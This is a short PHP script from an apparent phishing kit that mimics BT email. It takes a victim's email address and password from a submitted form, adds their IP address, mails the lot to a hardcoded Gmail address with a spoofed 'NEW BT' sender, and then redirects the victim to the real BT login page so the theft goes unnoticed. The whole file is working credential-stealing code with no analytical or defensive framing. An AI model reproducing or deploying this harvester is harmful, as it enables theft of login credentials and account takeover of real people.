<?
$ip = getenv("REMOTE_ADDR");
$message .= "--------------ALL EMAIL Result adrut.bz-----------------------\n";
$message .= "Email Address : ".$_POST['u']."\n";
$message .= "Password : ".$_POST['p']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------Created By 360---------------------\n";
$recipient = "llencom3@gmail.com";
$headers = "From: NEW BT <collet@likeb4.zz>";
$subject = "HAVE MERCY OH LORD !! - adrut.bz";
$headers = "Endowed";
$headers .= "MIME-Version: 1.0\n";
if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: https://home.bt.com/login/loginform?s_cid=con_Furl_mail&utm_source=ATL&utm_medium=FURL&utm_content=R&utm_campaign=btmail");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>